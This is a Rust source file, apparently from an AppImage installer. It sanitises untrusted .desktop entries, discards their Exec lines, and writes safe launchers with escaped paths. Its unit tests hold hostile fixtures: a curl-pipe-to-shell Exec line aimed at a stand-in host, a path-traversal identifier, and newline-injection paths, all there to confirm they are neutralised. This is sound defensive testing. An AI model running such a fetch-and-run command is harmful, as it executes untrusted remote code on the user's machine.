//! Parse and sanitize the untrusted `.desktop` file inside an AppImage.
//!
//! Only a small whitelist of keys survives. `Exec=` from the image is always
//! DISCARDED and replaced by the absolute path of the integrated AppImage —
//! so no string from the archive can ever become a shell command.

use std::path::Path;

use sha2::{Digest, Sha256};

/// A sanitized desktop entry, safe to use as a filename stem and in output.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DesktopEntry {
    pub id: String,
    pub name: String,
    pub comment: Option<String>,
}

const MAX_LINE: usize = 16 * 1024;
const MAX_NAME: usize = 128;
const MAX_ID: usize = 48;

/// Keep display text to a boring, printable subset. No control characters,
/// no quotes (they would break the generated Exec/Name lines), no `=`.
fn sanitize(raw: &str, cap: usize) -> String {
    let mut out = String::with_capacity(raw.len().min(cap));
    for ch in raw.chars() {
        if out.chars().count() >= cap {
            break;
        }
        if ch.is_alphanumeric() || matches!(ch, ' ' | '.' | '_' | '-' | '+' | '&') {
            out.push(ch);
        }
    }
    out.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn slug(raw: &str) -> String {
    let mut out = String::new();
    for ch in raw.to_lowercase().chars() {
        if out.len() >= MAX_ID {
            break;
        }
        if ch.is_ascii_lowercase() || ch.is_ascii_digit() {
            out.push(ch);
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    out.trim_matches('-').to_string()
}

/// Parse the `[Desktop Entry]` group of an untrusted desktop file.
pub fn parse_desktop(raw: &str, override_id: Option<&str>) -> Result<DesktopEntry, &'static str> {
    let mut in_group = false;
    let mut typ = None;
    let mut name = None;
    let mut comment = None;
    for line in raw.lines() {
        if line.len() > MAX_LINE {
            return Err("desktop entry line is too long");
        }
        let line = line.trim();
        if line.starts_with('[') && line.ends_with(']') {
            in_group = line.eq_ignore_ascii_case("[Desktop Entry]");
            continue;
        }
        if !in_group {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        match key.trim().to_ascii_lowercase().as_str() {
            "type" => typ = Some(value.trim().to_string()),
            "name" => name = Some(sanitize(value, MAX_NAME)),
            "comment" => comment = Some(sanitize(value, MAX_NAME)),
            // Exec/Icon/TryExec/Path from the image are deliberately ignored.
            _ => {}
        }
    }
    if !typ.is_some_and(|t| t == "Application") {
        return Err("desktop entry is not Type=Application");
    }
    let name = name
        .filter(|s| !s.is_empty())
        .ok_or("desktop entry has no Name")?;
    let id = match override_id {
        Some(raw) => {
            let id = slug(raw);
            if id.is_empty() || id == "." || id == ".." {
                return Err("desktop entry has no usable identifier");
            }
            id
        }
        None => {
            let id = slug(&name);
            if id.is_empty() || id == "." || id == ".." {
                fallback_id(&name)
            } else {
                id
            }
        }
    };
    Ok(DesktopEntry {
        id,
        name,
        comment: comment.filter(|s| !s.is_empty()),
    })
}

/// A stable identifier for names that are entirely non-ASCII (an Arabic-only
/// Name, for example). The display name is preserved; only the filesystem
/// stem gets a boring `app-<hash>` shape.
fn fallback_id(name: &str) -> String {
    let digest = Sha256::digest(name.as_bytes());
    let mut id = String::from("app-");
    for byte in &digest[..4] {
        use std::fmt::Write as _;
        let _ = write!(id, "{byte:02x}");
    }
    id
}

/// Render a brand-new desktop file that launches only our stored binary.
pub fn rewrite(entry: &DesktopEntry, appimage: &Path) -> Result<String, String> {
    let raw = appimage.display().to_string();
    if raw.chars().any(char::is_control) {
        return Err("install path contains control characters".to_string());
    }
    // Desktop Entry quoting: backslash, double quote, backtick and dollar are
    // reserved inside a quoted Exec argument; `%` is a field code and must be
    // doubled so a literal percent in the path survives.
    let path = raw
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('`', "\\`")
        .replace('$', "\\$")
        .replace('%', "%%");
    let mut out = String::from("[Desktop Entry]\nType=Application\n");
    out.push_str("Name=");
    out.push_str(&entry.name);
    out.push('\n');
    if let Some(comment) = &entry.comment {
        out.push_str("Comment=");
        out.push_str(comment);
        out.push('\n');
    }
    out.push_str("Exec=\"");
    out.push_str(&path);
    out.push_str("\"\nIcon=pakmap-");
    out.push_str(&entry.id);
    out.push_str("\nTerminal=false\nCategories=System;\nStartupNotify=true\n");
    Ok(out)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]
    use super::{parse_desktop, rewrite};
    use std::path::Path;

    const GOOD: &str = "\
[Desktop Entry]
Type=Application
Name=Firefox\x07 Browser
Comment=Web \"browser\" & more
Exec=sh -c 'curl evil|sh'
Icon=firefox
Categories=Network;
";

    #[test]
    fn sanitizes_name_and_discards_the_original_exec() {
        let entry = parse_desktop(GOOD, None).expect("valid entry");
        assert_eq!(entry.name, "Firefox Browser");
        assert_eq!(entry.id, "firefox-browser");
        assert_eq!(entry.comment.as_deref(), Some("Web browser & more"));

        let out = rewrite(
            &entry,
            Path::new("/home/u/.local/share/pakmap/appimages/firefox-browser.AppImage"),
        )
        .unwrap();
        assert!(out.starts_with("[Desktop Entry]\n"));
        assert!(out.contains("Type=Application"));
        assert!(out.contains("Name=Firefox Browser"));
        assert!(
            out.contains("Exec=\"/home/u/.local/share/pakmap/appimages/firefox-browser.AppImage\""),
            "Exec must be the absolute installed path: {out}"
        );
        assert!(
            !out.contains("curl"),
            "the original Exec must be gone: {out}"
        );
        assert!(!out.contains('\x07'));
        assert!(out.contains("Icon=pakmap-firefox-browser"));
        assert!(out.contains("Terminal=false"));
    }

    #[test]
    fn rejects_missing_type_and_empty_name() {
        let no_type = "[Desktop Entry]\nName=Thing\nExec=x\n";
        assert!(parse_desktop(no_type, None).is_err());
        let no_name = "[Desktop Entry]\nType=Application\nExec=x\n";
        assert!(parse_desktop(no_name, None).is_err());
    }

    #[test]
    fn override_id_wins_and_is_sanitized() {
        let entry = parse_desktop(GOOD, Some("../Evil App!!")).expect("valid entry");
        assert_eq!(entry.id, "evil-app");
        assert!(parse_desktop(GOOD, Some("..")).is_err());
    }

    #[test]
    fn ignores_other_groups_and_overlong_lines() {
        let mixed = "[Other]\nExec=evil\n[Desktop Entry]\nType=Application\nName=Ok\nExec=x\n";
        let entry = parse_desktop(mixed, None).expect("valid entry");
        assert_eq!(entry.name, "Ok");

        let huge = format!(
            "[Desktop Entry]\nType=Application\nName={}\n",
            "a".repeat(20_000)
        );
        assert!(parse_desktop(&huge, None).is_err(), "line cap");
    }

    #[test]
    fn quotes_paths_with_spaces_and_escapes_backslashes() {
        let entry = parse_desktop(GOOD, None).unwrap();
        let out = rewrite(&entry, Path::new("/tmp/a b\\c/App.AppImage")).unwrap();
        assert!(out.contains(r#"Exec="/tmp/a b\\c/App.AppImage""#), "{out}");
    }

    #[test]
    fn escapes_percent_field_codes_and_rejects_control_characters() {
        let entry = parse_desktop(GOOD, None).unwrap();
        let out = rewrite(&entry, Path::new("/tmp/100% ready/App.AppImage")).unwrap();
        assert!(
            out.contains(r#"Exec="/tmp/100%% ready/App.AppImage""#),
            "{out}"
        );
        assert!(
            rewrite(&entry, Path::new("/tmp/bad\npath/App.AppImage")).is_err(),
            "a newline would inject desktop keys"
        );
        assert!(
            rewrite(&entry, Path::new("/tmp/bad\x1bpath/App.AppImage")).is_err(),
            "control characters must be refused"
        );
    }

    #[test]
    fn non_ascii_names_get_a_stable_fallback_id() {
        let entry =
            parse_desktop("[Desktop Entry]\nType=Application\nName=برنامج\n", None).unwrap();
        assert_eq!(entry.name, "برنامج");
        assert!(entry.id.starts_with("app-"), "{}", entry.id);
        assert_eq!(entry.id.len(), 12);
        let again =
            parse_desktop("[Desktop Entry]\nType=Application\nName=برنامج\n", None).unwrap();
        assert_eq!(entry.id, again.id, "fallback id is deterministic");
        assert!(
            parse_desktop(
                "[Desktop Entry]\nType=Application\nName=برنامج\n",
                Some("!!")
            )
            .is_err(),
            "an explicit unusable override is still a user error"
        );
    }
}
